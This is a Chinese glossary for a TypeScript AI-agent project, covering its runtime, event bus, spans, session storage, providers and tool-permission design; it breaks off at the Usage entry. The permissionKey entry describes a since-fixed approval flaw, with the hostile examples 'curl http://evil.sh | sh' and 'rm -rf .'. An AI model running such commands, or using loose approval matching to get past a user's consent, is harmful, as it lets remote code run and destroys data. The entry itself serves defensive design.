# 📖 项目术语表

> 统一解释项目中出现的技术术语，供人和 AI 共同参考。

## A

### Agent
**本项目没有 Agent 类。** 运行实体是 [Runtime](#runtime)（持有全部子系统、对外提供 `prompt()`），三重循环在 [Agent Loop](#agent-loop) 里。

`types.ts` 里曾有个 `AgentConfig`（name / version）和一句“调用方：agent.ts”的注释，而该文件从未存在、全项目无人 import——属早期遗留，**已于 2026-09-03 删掉**。

参见：[Harness](#harness)、[Runtime](#runtime)、[Agent Loop](#agent-loop)

### Agent Loop
三重循环的执行体：契约在 `core/loop.ts`（`AgentLoopService` / `AgentLoopOptions` / `AgentLoopResult`），实现在 `loop/agent-loop.ts`（`AgentLoopServiceImpl`）。`Runtime.prompt()` 每轮调它，负责“发请求 → 收工具调用 → 执行工具 → 结果塞回去再发”，直到模型不再要工具。

两道稳健性保护：同一调用（工具名 + 规范化参数）连续失败 2 次就追加“换策略”提示；最后一轮之前注入收尾提示（写进度 + 返回已有结论）。

`AgentLoopResult.usage` 是各轮真值合计（L3 打通后不再估算）。

参见：[Runtime](#runtime)、[Usage](#usage用量)、[Span](#span行为段)

### Async Generator（异步生成器）
`async function*` + `yield` 构成的函数，每次 `yield` 暂停执行，等待消费者调用 `next()` 后继续。本项目 LLM 流式输出用的就是它——但对外暴露的是 [EventStream](#eventstream推拉通道)（`implements AsyncIterable`，内部用 `async *[Symbol.asyncIterator]()` 把队列转发出去），不是裸生成器。

## B

### Backpressure（背压）
消费者处理速度慢于生产者时，生产速度自然受抑制的机制。在 `for await...of` 中，循环体执行完才调 `next()` 取下一个值，天然实现背压。

## C

### Check
启动前检查阶段，位于 `harness/check.ts`。读取配置、创建 LLM Provider、验证环境。结果通过 `CheckResult` 注入 Runtime。

启动关键路径**已彻底断网**：连通性与模型列表探测都挪到后台，UI 出现之前不再等任何网络往返。配置坏到无法创建 Provider 时抛 `CheckFailureError`（携带诊断列表），Harness 打印红字后 `process.exit(1)`。

参见：[Harness](#harness)、[RuntimeOptions](#runtimeoptions)、[Diagnostic](#diagnostic诊断条目)

### CheckResult
`check()` 的返回值类型，定义在 `types.ts`：`llm`（已初始化的 Provider）、`config?`（LLMConfig，供 UI 展示模型名）、`diagnostics`（逐项检查结果）、`providerName`（激活供应商显示名，供后台网络探测的文案用）。由 `harness/index.ts` 接收后传入 `main()`。

### CLI 模式
Agent 内部持有 `while(true)` 循环、自驱动运行的交互方式。**本项目不是这种模式**：`Runtime` 既没有 `start()` 也没有 `stop()`，不持有任何循环。

对比：[Pi 模式](#pi-模式)（本项目采用的那种）

### CollectedSpan
消费端拿到手的**成品段**：一段已经结束、字段齐全、只读的行为记录（`name` / `spanId` / `turnId` / `seq` / `startedAt` / `durationMs` / `status` / `input` / `output`，异常时多一个 `error`）。契约在 `core/events.ts`，由 [SpanCollector](#spancollector段收集器) 配对产出。

`status` 四种：`ok` / `error` / `unclosed`（退出时仍未关门）/ `running`（还没出门，仅 `running()` 里出现）。

对比：[Span](#span行为段)（生产端手里那个还在跑的句柄）

### Compaction（上下文压缩）
历史太长时把早期对话摘要成一段，腾出上下文窗口。契约在 `core/compaction.ts`（`CompactionService`，Runtime 必注入子系统之一），实现在 `context/compaction.ts`；摘要的存放另有 `core/compaction-store.ts`（`CompactionStore`）——落在会话文件旁而不塞进消息流。

压缩本身也要调 LLM，走的是**非流式** `chat()`，并用 `trace('compaction', …)` 打卡成段。**已知缺口**：这条路径烧的 token 没有回流到 `totalUsage`（全文件无 `usage` 字样），所以 `/usage` 报的数偏少。

参见：[Span](#span行为段)、[Usage](#usage用量)

### Config（配置）
项目的运行参数文件，如 `package.json`、`tsconfig.json`。属于[项目元数据](#project-metadata项目元数据)的一类。

运行期配置由 `config/manager.ts` 统一读取，**四份文件 + 一条优先级链**（高 → 低）：环境变量（`apiKeyEnv` 指定）> 全局 `~/.ts-agent/config.json` > 项目 `config/provider-keys.json`（密钥，gitignore）> 项目 `config/active-config.json`（当前激活，不含 key）> 代码默认。供应商预设另在 `config/providers.json`（公开可提交）。

测试可用 `TS_AGENT_CONFIG` 环境变量把激活配置指向临时文件。

**没有 `config/api.json` 这个文件**（旧文档里这个路径是错的）。目前只有“密钥”分了三层存在域，供应商定义与 baseUrl 仍只在项目单一域（manager.ts 里记着这条 TODO）。

## D

### Diagnostic（诊断条目）
统一“启动检查结果”与“运行时错误”的结构，UI 一套渲染（定义在 `types.ts`）：`level`（`pass` / `warn` / `fail`）、`item`（来源标识：config / apikey / network / models / model / tool / llm）、`message`（人类可读说明）。

`warn` 是可继续但明示，`fail` 是阻断。`check()` 产出启动诊断，运行时错误事件复用同一结构。

诊断子系统契约在 `core/diagnostics.ts`（`DiagnosticsService`），实现在 `diagnostics/service.ts`，`/diagnostics` 命令读它。

参见：[Check](#check)、[CheckResult](#checkresult)

### DI 容器（Dependency Injection Container）
自动组装依赖的工具。向容器声明"我要一个 Runtime"，容器自动查找 Runtime 的依赖（LLMProvider、SessionStorage）以及这些依赖的依赖，全部创建好后返回。在本项目中未使用——手动组装完全可控，DI 容器的隐式查找反而增加理解成本。

参见：[ARCHITECTURE.md](./ARCHITECTURE.md#决策-6不做-di-容器)

### DeepSeek Provider
`LLMProvider` 接口的 DeepSeek 实现（`src/llm/deepseek.ts` 的 `DeepSeekProvider`）。`chat()` 返回 `ChatResult`、`stream()` 返回 `EventStream<LLMStreamEvent>`；OpenAI 兼容路径的公共逻辑在 `llm/stream-helper.ts`（`createChat` / `createSSEStream` / `resolveThinkingEnabled`）。

工厂是 `llm/index.ts` 的 `createProvider(config)`：`provider === 'anthropic'` → `AnthropicProvider`，**其余一律** → `DeepSeekProvider`（兼容 deepseek / openai / opencode-go / 自定义）。所以实现只有两个，`llm/types.ts` 注释里提到的 Ollama **尚未实现**。

参见：[LLMProvider](#llmprovider)、[Provider（供应商）](#provider供应商)、[EventStream](#eventstream推拉通道)

### Document（文档）
记录项目状态和历史的信息文件。属于[项目元数据](#project-metadata项目元数据)的一类。

本项目全在 `Log/` 下，分**两类，维护方式完全不同**：

- **append-only 日志**（`CHANGE_LOG.md` / `ARCHITECTURE_LOG.md` / `DECISION_LOG.md` / `ROADMAP.md`）：只追加、不改写旧条目，所以**天生不会过期**
- **现状快照**（`目录.md` / `ARCHITECTURE.md` / `TESTING.md` / `GLOSSARY.md`）：描述“现在是什么样”，**必须每轮跟着代码改**，一旦漏了就悄悄失真

另有五份规则书 `Log/*_RULES.md` 约定各日志怎么写。（旧文档里写的 `CHANGELOG.md` 是错的文件名，实际是 `CHANGE_LOG.md`。）

## E

### edit（精准编辑工具）
`tools/builtin.ts` 里的第 6 个内置工具（前 5 个：ls / read / write / grep / bash）。**四步**：读全文 → 数 `oldText` 命中次数 → `indexOf` + 字面切片拼接替换 → 按字节写回（保住行尾、编码与 BOM）。与 `write` 的分工：只改一小段用 `edit`，新建文件或整篇重写才用 `write`——重抄全文会把没打算改的地方一并改掉。

值钱的地方不在“会替换”，在**肯拒绝**。按命中次数三分流：

- **0 次** → 拒绝、文件一字不动，回 `[ERROR]` + 文件行数 + “先 read 看清原文”。模型记错原文时，任何“猜”都是破坏
- **1 次** → 替换、写回
- **多次** → 拒绝（除非显式传 `replaceAll: true`），回**候选行号**。“改第一处”是最危险的行为——它会静默改错地方，模型和用户都看不出来

三条实现约束值得记住：

- **不用正则**：`oldText` 里满是 `. * ( [ ?` 等元字符，走正则就得转义，漏转一个就把“改这一处”变成“改一片”
- **定位失败的前缀必须是 `[ERROR]`**：`agent-loop.ts` 只把 `[ERROR]` / `[VERIFY_FAILED]` 记作失败，而“重复失败保护”只在失败时计数（第 2 次同样调用就追加系统提示叫模型别原样重试、先去 read 确认）。改成 `[NO_MATCH]` 这类软前缀等于把这层保护关掉
- **CRLF 往返只对纯 CRLF 文件做**：`core.autocrlf=true` 检出的源码是 CRLF，而模型发来的 `oldText` 必然用 `\n`，不归一化则跨行匹配必然 0 命中；混合行尾的文件按字面匹配（宁可拒绝，也不做波及全文的还原）

参见：[permissionDetail](#permissiondetail权限弹窗文案)

### Event Subscription（事件订阅）
通过 `subscribe(handler)` 注册事件处理器，`emit(event)` 触发通知的模式。Pi 的 `prompt()` 返回 `void`，回复通过事件流传递。

本项目**两者都有**：`prompt()` 返回 `Promise<string>`（完整回复文本），同时全过程通过 [EventBus](#eventbus事件总线) 广播事件。UI 走的是后者。

对比：[OnToken Callback](#ontoken-callback)

### EventStream（推拉通道）
`runtime/event-stream.ts` 的 `class EventStream<T, R = void> implements AsyncIterable<T>`：生产端往里投、消费端 `for await` 取，内部用 `async *[Symbol.asyncIterator]()` 把队列转发出去（[Async Generator](#async-generator异步生成器) 说的机制就在这儿）。`LLMProvider.stream()` 返回的就是 `EventStream<LLMStreamEvent>`。

事件类型：`token`（正文片）/ `reasoning`（思维链片，不进 fullText）/ `thinking_block`（Anthropic 完整块，供下轮回放）/ `tool_call` / `end`（带 `usage?`）。

对比：[EventBus](#eventbus事件总线)（那个是全局广播，这个是单次调用的一对一通道）

### EventBus（事件总线）
`core/events.ts` 的契约，实现在 `runtime/events.ts` 的 `PromptEventEmitter`。`emit()` 只做两件事：给事件盖上公共头（`at` / `seq` / `turnId`），再**同步**广播给订阅者。它自己不配对、不落盘、不上屏——那些全是订阅者的事。

两把钥匙，区别很大：

- `subscribe(handler)`：通配收**全量**事件，返回值没人收——**只看**
- `on(type, handler)`：精确监听某一类事件，返回值经 `emitHook` 收回——**能改写流程**

事件类型另见 [PromptEvent](#promptevent)（该条曾长期标着“计划中”，现已校准为落地现状）。

参见：[Hook](#hook钩子扩展)、[Watcher](#watcher旁观扩展)、[Span](#span行为段)

### Extension（扩展）
放在 `src/extensions/` 下、由 `context/extension-loader.ts` 自动扫描装载的文件。**三类目录、三条口子**，区别只在注册函数拿到的 ctx 给了哪把钥匙：

- `sections/` → `registerSections(ctx)`，ctx = `{ addSection }`：往系统提示词加段落
- `hooks/` → `registerHooks(ctx)`，ctx = `{ on, events }`：**可改写流程**
- `watchers/` → `registerWatchers(ctx)`，ctx = `{ events }`：**只订阅，改不了**

watcher 的 ctx 里刻意不给 `on`——“旁观者改流程”在类型层面就不可能，不靠注释提醒也不靠使用自觉。

参见：[Hook](#hook钩子扩展)、[Watcher](#watcher旁观扩展)

## G

### Generator（生成器）
`function*` + `yield` 构成的函数。详见 [TS/生成器与异步生成器](../TS/生成器与异步生成器.md)（注：该链接指向仓库外的个人笔记库，仓库内无此文件）。

## H

### Harness
启动编排类（`export class Harness`），位于 `src/harness/index.ts`。`run()` 执行 `check()` → `main(result)` 的完整启动流程。Harness 不持有循环，只做编排。

它**自持一个事件发射器**（`events = new PromptEventEmitter()`）发 harness 层事件（`check_start` / `check_done`），并对外暴露 `subscribe()`——启动进度因此也能被订阅，不必等 Runtime 建好。

参见：[Runtime](#runtime)、[Check](#check)、[Diagnostic](#diagnostic诊断条目)

### Hook（钩子扩展）
这个词在项目里有**两个意思**，混了就会误读：

1. **装载口子意义的 hook**：住在 `src/extensions/hooks/`、export `registerHooks` 的扩展文件。目录名是按“怎么装进来”命名的。
2. **总线 API 意义的 hook**：`events.on(type, handler)`——精确监听，返回值经 `emitHook` 收回，因此**能改写流程**。

全项目只有两个发射点，都在 `context/system-prompt.ts`：`before_build` 与 `before_request`。

**住在 `hooks/` 目录 ≠ 用了 `on`**。`trace-log` 就曾住在这个目录却只用 `subscribe`，因此被误读为“trace 与钩子机制有关”，现已搬到 `watchers/`。

对比：[Watcher](#watcher旁观扩展)

## I

### InMemorySession
`SessionStorage` 接口的内存实现，位于 **`src/session/in-memory.ts`**（旧文档写的 `src/runtime/session.ts` 不存在）。数据存在内存数组里，进程重启即丢。

**它不是默认实现**——实际装配走 [JsonlSessionStorage](#jsonlsessionstorage)（落 `sessions/*.jsonl`）。

参见：[SessionStorage](#sessionstorage)

## J

### JsonlSessionStorage
**默认的会话存储实现**，位于 `src/session/jsonl-storage.ts`。它的文件头注释把模型说得很清楚：

- 每条消息是**树里的一个 entry**（`id` + `parentId`），**文件顺序 ≠ 对话顺序**
- **leaf 指针**标记“当前在哪条线上”：持久化靠 leaf entry，内存靠 `currentLeafId`
- `fork` 复制根 → leaf 前缀到新文件，**原文件不动**（审计性）

一行一条落 `sessions/*.jsonl`，形如 `{"type":"message","id":"m2","parentId":"m1","role":"assistant","content":"...","timestamp":2}`。`/history` 读 `getAllStored()` 展示当前分支，`/sessions` 读 `getDir()` 列会话，`/fork` 走 `forkTo()`。

**压缩摘要就在同一个文件里**：`JsonlSessionStorage` 自己 `implements CompactionStore`，`appendCompaction(summary, firstKeptId)` 往树里追加一条 `{"type":"compaction","id":...,"parentId":...,"summary":...,"firstKeptId":...}` entry，`getMessages()` 遇到它就转成 `[对话摘要] …` 的 system 消息。

**不存在独立的 `sessions/*_summary.jsonl`**——那是 v1 机制，全 `src/` 无一行代码写它（旧词条此处写错，已于 2026-09-04 改正）。现存的 `sessions/archive-v1/default_summary.jsonl` 只是归档遗物，而 `isSessionFileName()` 还专门把含 `_summary` 的文件**排除**在 `/sessions` 列表外。

`message` entry 除 `role` / `content` 外还有三个可选结构化字段（`tool_calls` / `tool_call_id` / `name`），格式上支持 function calling 往返——但**当前既无人写入也无人消费**，见 [ARCHITECTURE.md](./ARCHITECTURE.md#四已知架构债) 第四节第 9 条。

参见：[SessionStorage](#sessionstorage)、[InMemorySession](#inmemorysession)、[Compaction](#compaction上下文压缩)

## L

### LLMConfig
LLM Provider 配置类型（`llm/types.ts`），读取自 **`config/active-config.json`**：`provider?`（厂商标识）、`baseUrl`、`apiKey`、`model`、`thinking?`（`'auto' | 'on' | 'off'`）。

（旧文档写的 `config/api.json` 不存在，字段也不止三个。）

参见：[Config（配置）](#config配置)

### LLMMessage
一条对话消息（`llm/types.ts`）：`role` 有**四种**（`system` / `user` / `assistant` / **`tool`**）、`content` 文本，另有可选的 `tool_calls?`（仅 assistant）、`thinkingBlocks?`（仅 assistant、仅 Anthropic 路径）、`name?` 与 `tool_call_id?`（仅 tool）。

`thinkingBlocks` 的作用域是**单次 `run()` 内的内存消息链**——`MessageEntry` 没有这个字段，块永不落盘，所以跨轮次没有回放义务。

别把理由记成“会话存储只存纯文本”（旧版本条与 `llm/types.ts` 注释都这么写，2026-09-04 查出是错的）：`tool_calls` / `tool_call_id` / `name` 是**能**落盘并还原的，只是 `runtime.ts` 组装请求时又把它们丢了，而那道丢弃是承重的——见 [ARCHITECTURE.md](./ARCHITECTURE.md#四已知架构债) 第四节第 9 条。

### LLMProvider
LLM 调用抽象接口，位于 `src/llm/types.ts`。两个方法：`chat(messages, tools?, opts?)` 返回 `Promise<ChatResult>`（非流式，含结构化工具调用）、`stream(messages, tools?, opts?)` 返回 `EventStream<LLMStreamEvent>`（流式）。

**实现只有两个**：`DeepSeekProvider`（OpenAI 兼容）与 `AnthropicProvider`。注释里提到的 Ollama / 自定义协议尚未实现。

注意别和 [Provider（供应商）](#provider供应商) 混了——那是供应商元数据，不是调用抽象。

参见：[DeepSeek Provider](#deepseek-provider)、[EventStream](#eventstream推拉通道)

## M

### Mode（运行模式）
`enum Mode { Repl = 'repl', Rpc = 'rpc' }`（`types.ts`），用于切换交互模式。缺省 `Repl`。

**两种都已落地**：`harness/repl.ts` 的 `runReplMode()` 与 `harness/rpc.ts` 的 `runRpcMode()`，由 `harness/main.ts` 按 mode 分派。（旧文档写“未来支持 Rpc”已过期。）

### MockSession
`SessionStorage` 的测试替身，位于 **`src/session/mock.ts`**（旧文档写的 `src/runtime/session.mock.ts` 不存在）。`messages` 字段公开，测试中可直接断言内容。

参见：[SessionStorage](#sessionstorage)

## O

### OnToken Callback
`prompt(input, onToken?, streamingBehavior?)` 的第二个可选参数，每收到一个流式 chunk 时调用一次。

**当前三个调用点全都不传它**：`repl.ts` 与 `rpc.ts` 只传 input，`tree-ui.ts` 甚至显式写 `undefined` 跳过它去传第三个参数。UI 联动实际走 [EventBus](#eventbus事件总线) 订阅。Runtime 内部仍会在个别分支调它（如插入 steer 消息时回一句提示），所以它没死，只是**没人从外面接**。（旧文档写它是“当前 UI 联动方式”已过期。）

对比：[Event Subscription](#event-subscription事件订阅)

## P

### permissionDetail（权限弹窗文案）
`core/tools.ts` 里 `ToolDefinition` 与 `ToolProvider` 的**可选成员**（签名 `(args) => string`），工具用它自定义权限确认弹窗里显示什么。不提供（或返回空串）时 `agent-loop.ts` 退回默认的 `JSON.stringify(args).slice(0, 80)`。

为什么需要它：那 80 字符对 `write` 勉强够用（能看到 path），但 [edit](#edit精准编辑工具) 的参数里有 `oldText` / `newText` 两段文本，前 80 字符连路径都显示不全——用户在弹窗里看不出要改什么，却要在这时候决定放不放行。

两条硬约束（违反会坏 UI）：

- **必须返回单行**：`selector.ts` 的标题只占 1 行（另加 1 行分隔线）、每行过 `fitWidth` 截断（**截断不折行**）。文案里带 `\n` 会多出一个物理行，把“固定行数 + 回退清行”算错 → 选择器漂移
- **不要在这里做文件 I/O**：它在渲染路径上被同步调用

它**只管显示**。授权匹配用的是另一个键（`agent-loop.ts` 里的 `autoKey`，见 [permissionKey](#permissionkey授权匹配键)）——若把富文本 detail 当匹配键，“本次全部允许”会永远匹配不上，因为每次文案都不一样。改前匹配、记录（`grantAutoAllow`）与显示这三个职责由同一个 `detail` 变量兼着（一变量三职），2026-09-04 拆成两个变量；同日晚些时候**匹配键本身也换了**（不再是 args 的 JSON 前 80 字符，而是工具定义的授权边界且不截断）——授权只存在内存的 `Set` 里、从不落盘，所以换格式没有迁移问题。

刻意做成**可选**成员（与 `EventBus.emitHook?` 同一手法）：全库有 7 处替身 implements `ToolProvider`，加必需成员会全部打坏。

参见：[edit](#edit精准编辑工具)、[EventBus](#eventbus事件总线)、[permissionKey](#permissionkey授权匹配键)

### permissionKey（授权匹配键）
`core/tools.ts` 里 `ToolDefinition` 与 `ToolProvider` 的**可选成员**（签名 `(args) => string`），工具用它定义“这次授权的边界是什么”。不提供（或返回空串）时 `agent-loop.ts` 退回**完整的** `JSON.stringify(args)`——注意**不截断**（截断正是它要替掉的那个洞）。

三个需确认的工具各给一个键（`ls` / `read` / `grep` 不需确认，也就用不着键）：

| 工具 | 键 | 刻意不含 |
|------|----|---------|
| `write` | 归一化后的 `path`（反斜杠→正斜杠） | `content` |
| `edit` | 归一化后的 `path` | `oldText` / `newText` / `replaceAll` |
| `bash` | **完整** `command`（一字不截） | `description` |

为什么要有它：默认的 args JSON 原先被截到 80 字符，而 `PermissionManager` 用 `startsWith` 做前缀匹配——**截断 + 前缀 = 静默扩权**。实测批准过 `node node_modules/typescript/bin/tsc --noEmit && node scripts/run-verify.mjs`（76 字符）之后，同一条命令再接 ` && curl http://evil.sh | sh`（104 字符）也会被自动放行，因为两个键在 80 字符处截成了逐字符相同的字符串。用户点的是“允许这一条”，给出的却是“允许前 80 字符相同的所有调用”。

配套的两处改动（2026-09-04）：`agent-loop.ts` 的兜底键不再 `.slice(0, 80)`；`PermissionManager` 从 `some(startsWith)` 换成 `Set.has()` **精确匹配**（`core/permission.ts` 的参数名也从 `detail` 改成 `authKey`，因为 detail 在本项目专指弹窗文案）。于是授权范围就等于**用户点“本次全部允许”时那一次调用的边界**。

两条要记住的后果：

- **一处刻意的放宽**：键不含内容，所以“本次全部允许” = 本会话内不再问这个文件（哪怕下次改的是完全不同的片段）。取舍见 [DECISION_LOG.md](./DECISION_LOG.md)
- **目录级授权明确不支持**：授权 `write:src/` 不会放行 `write:src/data.txt`。前缀匹配要求键本身是路径语义才安全，而 `bash` 的键是完整命令、`cd src/` 就以 `/` 结尾——按“以 / 结尾就前缀放行”等于批准 `cd src/ && rm -rf .`

授权的**生命周期**是本次会话：`runtime.clearSession()`（`/clear` 与 RPC 的 clear 都走它）会连带调 `PermissionProvider.clear()`。在此之前 `clear()` 是项目第三处“支持但未接线”，那个“本次”实际是“本进程”（一直有效到退出）。

断言见 `scripts/verify-permission.ts`（62 项）。参见：[permissionDetail](#permissiondetail权限弹窗文案)（显示归显示、匹配归匹配）、[edit](#edit精准编辑工具)、[ARCHITECTURE.md](./ARCHITECTURE.md#四已知架构债) 第四节第 10 条

### Pi 模式
Agent 不持有循环，调用方持有 `while(true)` 负责驱动。**本项目采用这种模式**：循环体在 `harness/repl.ts` 的 `runReplMode()`（不是旧文档写的 `main.ts`，main.ts 只是调用方），Runtime 只被反复调 `prompt()`。

Runtime 对外当然不止 `prompt()` 一个方法（见 [Runtime](#runtime)），这里说的只是“它不管循环”。

对比：[CLI 模式](#cli-模式)

### Project Metadata（项目元数据）
不产生功能但定义项目如何被理解的所有文件。分为四类：Rule、Document、Config、Skill。

参见：[[项目元数据（Project Metadata）]]

### PromptEvent
事件系统的事件类型（**早已落地**，不再是“计划中”）。契约在 `core/events.ts`，实现在 `runtime/events.ts`，十余种类型 + 四组骨架 span。

详见 [EventBus](#eventbus事件总线)、[Span](#span行为段)。本条只保留词条名，免得旧链接断掉。

### Provider（供应商）
**别和 [LLMProvider](#llmprovider) 混了**，两个完全不同的东西，名字像而已：

- `LLMProvider`（`llm/types.ts`）= **调用抽象**：`chat()` / `stream()`
- `Provider`（`llm/provider.ts`）= **供应商元数据**：显示名、模型列表、`getApiKey` / `fetchModels` 行为引用。由 `createProviderFromConfig()` 造、`ProviderRegistry` 持有（`ConfigManager` 用它，`/model` 列模型时读它）

设计要点写在 provider.ts 的注释里：数据在外部配置、对象只持行为引用。模型列表是**后台预热 + 按需现拉**，不在启动关键路径上。

参见：[LLMProvider](#llmprovider)

## R

### REPL 模式
`Read → Eval → Print → Loop` 的交互循环。用户打字 → Agent 回复 → 等下一次输入。

循环体在 **`harness/repl.ts` 的 `runReplMode()`** 里（`harness/main.ts` 只是调用方——旧文档写“在 main.ts 的 runReplMode()”把定义和调用混了）。对应的 RPC 模式在 `harness/rpc.ts`。

参见：[Mode（运行模式）](#mode运行模式)、[Pi 模式](#pi-模式)

### Rule（规则）
约束 AI 或开发者行为的文件。属于[项目元数据](#project-metadata项目元数据)的一类。

本项目是 `CLAUDE.md`（项目根，给 AI 的总则）+ `Log/*_RULES.md` 五份规则书（分别约定变更日志、架构演进日志、决策日志、ROADMAP、目录文档怎么写）。（旧文档举的 `CLAUDE.init.md` 不存在。）

### Runtime
运行时上下文类（`export class Runtime`），位于 `src/runtime/runtime.ts`。**持有 11 个必注入子系统**（见 [RuntimeOptions](#runtimeoptions)），不只是 LLMProvider。

对外主要方法：`prompt()`（返回 `Promise<string>`）、`subscribe()` / `on()`（事件）、`registerCommand()` / `listCommands()`、`select()` / `selectMulti()` / `readLineInput()`（交互钩子，TTY 由 TreeUI 注册实现，管道模式退回默认）、`onInput()`、`clearSession()`、`getHistoryMessages()`、`getTraces()` / `getRunningSpans()`（观测只读委派）。

它**没有** `start()` / `stop()`——不持有循环（见 [Pi 模式](#pi-模式)）。

### RuntimeOptions
Runtime 构造选项（`types.ts`）。**11 个必注入**（无默认值，`main.ts` 显式组装）：`llm`、`session`、`tools`、`permission`、`skills`、`events`、`spanCollector`、`commandSystem`、`diagnosticsService`、`compaction`、`systemPromptService`。

可选：`mode`、`model` / `provider` / `baseUrl`（供 `/model` 查看切换）、`thinking`（阶段 C2 三态）、`services`（仍是 `unknown`，标着 TODO）。

（旧文档只列了 `mode`/`llm`/`session`/`services` 四项，漏掉九个必注入子系统。）

## S

### SessionStorage
会话存储接口。**唯一真身在 `core/storage.ts`**：三个必需方法（`appendMessage(role, content, extra?)`、`getMessages()`、`clear()`）+ 三个**可选成员**（`getAllStored?` / `forkTo?` / `getDir?`，即 entry 树能力）。三个实现：[JsonlSessionStorage](#jsonlsessionstorage)（**默认**，落盘，三个可选成员全有）、[InMemorySession](#inmemorysession)、[MockSession](#mocksession)（测试替身，后两个都没有可选成员）。

`types.ts` 里也 export 这个名字，但那只是**转发**（`export type { SessionStorage, StoredMessage } from './core/storage.js'`），不是第二个接口；`RuntimeOptions.session` 直指 core 版，所以调用方能直接拿到可选成员。

**可选成员靠能力探测缩窄，不靠 `instanceof`**：`runtime.ts` 写的是 `if (this.session?.getAllStored)` 这类判断——实现了该成员就是 entry 树存储，没实现就走 `getMessages()` 兜底。（2026-09-03 之前这里写的是 `instanceof JsonlSessionStorage`，且 `types.ts` 另有一个只含三必需方法的同名接口，两处注释互相矛盾；已收敛，过程见 [ARCHITECTURE.md](./ARCHITECTURE.md#四已知架构债) 第四节第 1 条。）

走接口调用时注意：`StoredMessage` 的 `id` 与 `msgId` **都是可选的**（兼容 JSONL 用 `id`、对外 API 用 `msgId`），而 `JsonlSessionStorage` 自己的签名比接口窄（`msgId` 必填）。所以 runtime 里显式做了兜底：`m.msgId ?? m.id ?? ''`。

### SSE（Server-Sent Events）
HTTP 流式传输协议，服务端持续发送 `data: {...}\n` 格式的事件。DeepSeek 和 OpenAI 的流式 API 都基于 SSE。

### Skill（技能）
Agent 可调用的能力模块，**已落地**（旧文档标“计划中”已过期）：

- `runtime/skill.ts`：`SkillLoader extends Loader<LoadSkillsResult>`，配 `Skill` / `SkillFrontmatter` 类型（读 markdown 的 frontmatter 取元信息）
- `context/sections/skills-section.ts`：把可用技能写进 system prompt
- 技能文件放项目根 `skills/`（现有 `review.md`）

`SkillLoader` 是 Runtime 的必注入子系统之一（`RuntimeOptions.skills`）。

不属于[项目元数据](#project-metadata项目元数据)——Skill 是可执行的，元数据是声明式的。

### Span（行为段）
一次**有始有终**的行为，用“进门 / 出门”两个事件括起来。生产端拿到的是一个句柄：

- `span.set(…)`：往里塞字段。**不发事件**，只攒在闭包里
- `span.end(…)` / `span.fail(…)`：关门。此刻才把攒的字段一起并进出门事件

四组**骨架 span**（名字与字段受类型约束，写错段名或字段编译不过）：`prompt` / `llm_request` / `tool_call` / `compaction`。另有**便签通道** `note_start` / `note_end`，载荷是自由字典，扩展想加就加。

段是**嵌套的**：prompt 包着 llm_request，llm_request 又包着 tool_call。所以统计合计耗时**不能把各段 `durationMs` 相加**（会把同一段时间重复计好几遍），只能取最外层且彼此不重叠的 prompt 段。

参见：[SpanRecorder](#spanrecorder打卡机)、[CollectedSpan](#collectedspan)

### SpanCollector（段收集器）
**消费端**的配对件。契约在 `core/events.ts`（`feed` / `attach` / `recent` / `running` / `drainUnclosed`），实现在 `runtime/span-collector.ts` 的 `SpanCollectorImpl`，产出 [CollectedSpan](#collectedspan)。

配对规则：只认带 `spanId` 的事件（`tool_execution_start/end` 这类 UI 事件没有 `spanId`，不参与）· `_start` 进门登记 · `_end` 出门合并 · 孤儿 end **忽略而不猜** · 信封字段剥掉 · 便签段载荷走 `attrs`。

**总线自己不配对**，配对只在这里，全项目一份。两个消费者各持**独立实例**：`/traces` 命令（内存环形队列，缺省 200 条）与 `trace-log` watcher（`capacity:0`，成段即落盘）——不共享是为了消费者互不知情，且核心命令不能反过来依赖一个可选扩展。

对比：[SpanRecorder](#spanrecorder打卡机)（一个帮生产端打卡，一个帮消费端收段）

### SpanRecorder（打卡机）
**生产端**的打卡契约，在 `core/events.ts`。两个方法分工清楚：

- `trace(name, attrs, fn)`：回调式自动包裹，try/finally 结构保证关门
- `beginSpan(name, attrs)`：手动版。专给 prompt 段——它跨 `continue` 与 `finally`，套不进回调，只能在 finally 里判 `root.closed` 兼顾正常与异常两条出路

`spanRecorderOf(bus)` 做两件事：**类型收窄**（`EventBus` 接口里没有 `beginSpan`/`trace`，打卡能力在 `SpanRecorder` 这个另外的接口里，直接写 `events.trace(…)` 编译不过）与**能力探测退化**（测试替身只实现 `subscribe`/`on`/`emit` 时返回 `NOOP_SPAN_RECORDER`）。

NOOP **不是跳过这段代码，是跳过打卡**：回调照常执行，只换成空句柄。观测是旁路，不能反噬主流程。

对比：[SpanCollector](#spancollector段收集器)

## T

### thinking（思维链）
让模型先推理再作答。三态开关，配在 `config/active-config.json` 的 `thinking` 键：

- `'on'` → 常开
- `'off'` → 强制关
- `'auto'` / 缺省 → 由 **Runtime** 按“有无进行中任务”判定后**按次下发**（`LLMRequestOptions.thinking`，优先级高于配置）

三个阶段：**C1** 开关与流解析（OpenAI 兼容路径的 `reasoning_content` → `reasoning` 事件，只展示、不进 fullText 与历史）；**C2** auto 判定；**C3** Anthropic 多轮回放。

C3 的关键约束：`ThinkingBlock` = 推理文本 + `signature`（Anthropic 对块内容的加密签名），下一轮必须**一字不改原样回放**，否则签名验证失败 400——它是**协议数据而非展示内容**。安全阀：assistant 历史里带 `tool_calls` 却没有对应 thinking 块时强制不开。

参见：[LLMConfig](#llmconfig)、[EventStream](#eventstream推拉通道)

### trace.jsonl
`trace-log` watcher 的落盘产物，**一行一段完整行为**。含对话正文片段，**属隐私**，所以默认不写——必须显式设 `TS_AGENT_TRACE=1`（`TS_AGENT_TRACE_FILE` 可改路径，缺省项目根）。

进程退出时会把仍没关门的段补记成 `status:'unclosed'`，让“漏关门”从静默变成一眼可见。

参见：[Watcher](#watcher旁观扩展)、[CollectedSpan](#collectedspan)

### TTFT（首字延迟 / firstTokenMs）
从发出请求到收到第一个 token 的毫秒数。**只有生产端能在“收到第一个 token 那一刻”量到**，出了那个作用域就永久丢失，任何下游都重建不出来——所以它由生产端 `span.set()`，不由总线计算。

对比：`durationMs`（整段耗时，由总线在关门时用 `Date.now() - startedAt` 算）

### turnId
一次用户输入引发的全部事件共用的分组标记，由 `events.beginTurn()` 换发，同时事件序号归零。**仅在不在流式中时换发**——用户在生成期间输入的消息会走排队分支再次进入 `prompt()`，那时若换发，在飞回合的后续事件会被错误归到新组里。

参见：[EventBus](#eventbus事件总线)

## U

### Usage（用量）
token 消耗统计（`llm/types.ts` 的 `LLMUsage`：`promptTokens` / `completionTokens` / `totalTokens`，**只有三个槽**——Anthropic 的缓存命中率明细因此不单列，先把总量报对）。

**L3 打通后是 API 返回的真值，不再估算**：

